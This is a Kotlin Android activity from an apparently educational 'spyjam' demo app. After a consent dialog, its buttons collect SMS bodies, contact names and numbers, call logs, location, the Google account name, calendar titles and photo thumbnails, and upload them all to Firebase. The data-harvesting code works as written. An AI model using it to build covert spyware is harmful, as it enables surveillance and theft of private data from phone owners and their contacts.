package ut.ee.cs.spyjam

import android.Manifest
import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.location.Location
import android.net.Uri
import android.os.*
import android.provider.CalendarContract
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import android.util.Size
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import kotlinx.android.synthetic.main.activity_main.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.URI
import java.net.URL
import java.util.*
import kotlin.collections.ArrayList
import kotlin.collections.HashMap


class MainActivity : AppCompatActivity() {
    private var smsArr = ArrayList<String>()
    private var nameList = ArrayList<String>()
    private var numberList = ArrayList<String>()
    var randomID = UUID.randomUUID()
    var randstr = randomID.toString()
    var randomIDtext = "UID: $randstr"
    val database = FirebaseDatabase.getInstance()
    var storage = FirebaseStorage.getInstance()
    val myRef = database.getReference("userData").child("$randomID")
    val REQ_CODE = 1
    var a = 0
    var b = 0
    var c = 0
    var d = 0
    var e =0
    var f = 0
    var g= 0
    var h = 0
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    @SuppressLint("NewApi")
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setContentView(R.layout.activity_main)
        //alert dialog
        val builder = AlertDialog.Builder(this)
        builder.setTitle("Info")
        builder.setMessage("This application is only for educational purposes. It can read personal data such as contacts,SMS,calendar events,location coordinates etc. Press buttons to collect data. All permissions have to be granted to use the application!")
        builder.setPositiveButton("Agree"){ dialog, which ->
            Toast.makeText(applicationContext, "Press buttons to collect data!", Toast.LENGTH_SHORT).show()
        }
        val dialog: AlertDialog = builder.create()
        dialog.show()
        //alert dialog


        sms.setOnClickListener {
            smsThread.start()
           sms.isClickable=false
            sms.alpha=0.5f
            val text = "Uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()
            showid.text = randomIDtext
            a++
            if(a>0 && b>0 && c>0 && d>0 && e>0 && f>0){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
        }

        button2.setOnClickListener {
           namesThread.start()
            showid.text = randomIDtext
            button2.isClickable=false
            button2.alpha=0.5f
            val text = "Uloaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()
            b ++
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
        }

        location.setOnClickListener {
            location.isClickable=false
            showid.text = randomIDtext
            location.alpha=0.5f
            getLocation()
            c++
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
        }

        account.setOnClickListener {
            getAccName()
            showid.text = randomIDtext
            account.isClickable=false
            account.alpha=0.5f
            d++
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
        }

        events.setOnClickListener {
            getCalendarEvents()
            showid.text = randomIDtext
            events.isClickable = false
            events.alpha = 0.5f
            val text = "Uloaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration).show()
            e++
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
        }
        logs.setOnClickListener {
            showid.text = randomIDtext
            logs.isClickable = false
            logs.alpha = 0.5f
            getLogs()
            val text = "Uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration).show()
            f++
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 ){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
        }
        button4.setOnClickListener {
            g++
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 && h>0 ){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
            showid.text = randomIDtext
            getPicture()
            button4.isClickable= false
            button4.alpha = 0.5f
        }
        button.setOnClickListener {
            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 && h>0 ){
                val intent = Intent(this, LinkDemo::class.java)
                startActivity(intent)
                val i = Intent(this, LinkDemo::class.java)
                i.putExtra("message", randstr)
                startActivity(i)
            }
            h++
            showid.text = randomIDtext
            button.isClickable = false
            button.alpha = 0.5f
        }

        getall.setOnClickListener {
            getall.isClickable = false
            getall.alpha = 0.5f
            Handler(Looper.getMainLooper()).postDelayed({
                getLogs()
            }, 1000)
            Handler(Looper.getMainLooper()).postDelayed({
                getContactDetails()
            }, 1000)
            Handler(Looper.getMainLooper()).postDelayed({
                getCalendarEvents()
            }, 1000)
            getSMS()
            Handler(Looper.getMainLooper()).postDelayed({
                getLocation()
            }, 1000)
            Handler(Looper.getMainLooper()).postDelayed({
                getAccName()
            }, 1000)
            Handler(Looper.getMainLooper()).postDelayed({
                getPicture()
            },1000)

            val intent = Intent(this, LinkDemo::class.java)
            startActivity(intent)
            val i = Intent(this, LinkDemo::class.java)
            i.putExtra("message", randomIDtext)
            startActivity(i)
        }

        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)!=PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(
                this, arrayOf(
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.GET_ACCOUNTS,
                    Manifest.permission.READ_PHONE_NUMBERS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_CALENDAR,
                    Manifest.permission.READ_EXTERNAL_STORAGE

                ), REQ_CODE
            )
        }
        else{
            Log.d("log", "worked")
        }
        //permissions

    }


    //threads for functions
    @RequiresApi(Build.VERSION_CODES.O)
    val smsThread = Thread {
        getSMS()
    }
    val namesThread = Thread {
        getContactDetails()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    )   {
        if (requestCode==REQ_CODE){
            Log.d("log", "girdi")
        }
    }
    @RequiresApi(Build.VERSION_CODES.O)
    private fun getSMS() {
        val cursorSMS = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null)
        var i = 0
        while (cursorSMS!!.moveToNext() && i!=5){
            val messageBody = cursorSMS!!.getColumnIndex("body")
            val sms = cursorSMS.getString(messageBody)
            i++
            smsArr.add(sms)
        }
        cursorSMS.close()
        myRef.child("SMS").setValue(smsArr)
    }
    @SuppressLint("NewApi")
    private fun getContactDetails() {

        val NumberCursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null
        )
        var number = ""
        var nameStep=0
        var numberStep=0
        val nameCursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null
        )
        while (nameCursor!!.moveToNext() && nameStep!=5){
            val name = nameCursor.getString(nameCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)).toString()
            nameStep++
            nameList.add(name)
        }
        while (NumberCursor!!.moveToNext() && numberStep!=5) {
            val numberID = NumberCursor.getString(NumberCursor.getColumnIndex(ContactsContract.Contacts._ID))
            val numberCursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                arrayOf<String>(numberID),
                null
            )
            numberStep++
            while (numberCursor!!.moveToNext()){
                val rowID = NumberCursor.getString(NumberCursor.getColumnIndex(ContactsContract.Contacts._ID))
                number = numberCursor.getString(numberCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).toString()
                numberList.add(number)
            }


            numberCursor.close()

        }
        myRef.child("Numbers").setValue(numberList)
        nameCursor.close()
        myRef.child("ContactNames").setValue(nameList)
    }

    @SuppressLint("MissingPermission")
    fun getLocation(){
        var myLatitude = 0.0
        var myLongitude = 0.0
        fusedLocationClient.lastLocation
            .addOnSuccessListener { location: Location? ->
                myLatitude = location!!.latitude
                myLongitude = location.longitude
                myRef.child("locationCoordinates").setValue("$myLatitude , $myLongitude")
            }

        val text = "Updated!"
        val duration = Toast.LENGTH_SHORT
        val toast = Toast.makeText(applicationContext, text, duration)
        toast.show()
    }

    fun getAccName(){
        val  manager = getSystemService(ACCOUNT_SERVICE) as AccountManager
        val list = manager.accounts
        if (list.size>0){
            var gmail = "empty"
            for (account in list){
                if (account.type.equals("com.google", ignoreCase = true)){
                    gmail = account.name
                    break
                }
            }
            val text = "Uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration).show()
            myRef.child("AccName").setValue(gmail)
        }
        else {
            val text = "Uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration).show()
            myRef.child("AccName").setValue("empty")
        }
    }


    @RequiresApi(Build.VERSION_CODES.O)
    @SuppressLint("MissingPermission")
    fun getLogs(){
        val callMap = HashMap<String, String>()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null
        )
        while (cursor!!.moveToNext()){
           val numberIndex = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
           val durationIndex = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
           val number = cursor.getString(numberIndex)
           val callDuration = cursor.getString(durationIndex)
           callMap.put(number, callDuration)
        }
        cursor.close()
        myRef.child("CallDuration").updateChildren(callMap as Map<String, Any>)
    }

     @SuppressLint("MissingPermission", "NewApi", "SimpleDateFormat")
     fun getCalendarEvents(){
         val eventArr = ArrayList<String>()
         val uri = CalendarContract.Events.CONTENT_URI;
         val selection = CalendarContract.Events.EVENT_LOCATION + " = ? "
         val myProjection = arrayOf(
             "_id",
             CalendarContract.Events.TITLE,
             CalendarContract.Events.DTSTART
         )
         val cursor = contentResolver.query(uri, myProjection, null, null)
         var eventSteps = 0
         while (cursor!!.moveToNext() && eventSteps!=10) {
             var title = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.TITLE))
             eventArr.add(title)
             eventSteps++
         }
         cursor.close()
         myRef.child("calendarEvents").setValue(eventArr)
     }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun getPicture() {
        var l = 0
        var downloadUri: String = ""
        var linkList = mutableListOf<Uri>()
        val imageProjection = arrayOf(
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media._ID
        )
        val imageSortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            imageProjection,
            null,
            null,
            imageSortOrder
        )
        cursor.use {
            it?.let {
                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

                while (it.moveToNext() && l!=5) {
                    val id = it.getLong(idColumn)
                    val name = it.getString(nameColumn)
                    val size = it.getString(sizeColumn)
                    val date = it.getString(dateColumn)

                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id
                    )
                    val thumbnail = (this as Context).contentResolver.loadThumbnail(
                        contentUri,
                        Size(480, 480),
                        null
                    )
                    val baos = ByteArrayOutputStream()
                    thumbnail.compress(Bitmap.CompressFormat.JPEG, 100, baos)
                    val data = baos.toByteArray()
                    l++
                    val storageRef= storage.getReference("image no $l")
                    val uploadTask = storageRef.putBytes(data)
                    uploadTask.addOnFailureListener {
                        Log.d("fl","fail")
                    }.addOnSuccessListener { taskSnapshot ->
                        val text = "Uploaded!"
                        val duration = Toast.LENGTH_SHORT
                        val toast = Toast.makeText(applicationContext, text, duration).show()
                    }
                    uploadTask.continueWithTask { task ->
                        if (!task.isSuccessful) {
                            task.exception?.let {
                                throw it
                            }
                        }
                        storageRef.downloadUrl
                    }.addOnCompleteListener { task ->
                        if (task.isSuccessful) {
                            val downloadUri = task.result
                            Handler(Looper.getMainLooper()).postDelayed({
                                val ra = UUID.randomUUID().toString()
                                myRef.child("links/$ra").setValue(downloadUri.toString())
                            }, 1000)
                        } else {
                            Log.d("fail","fail")
                        }
                    }
                }
            } ?: kotlin.run {
                Log.e("TAG", "Cursor is null!")
            }
        }
        cursor!!.close()
    }
}

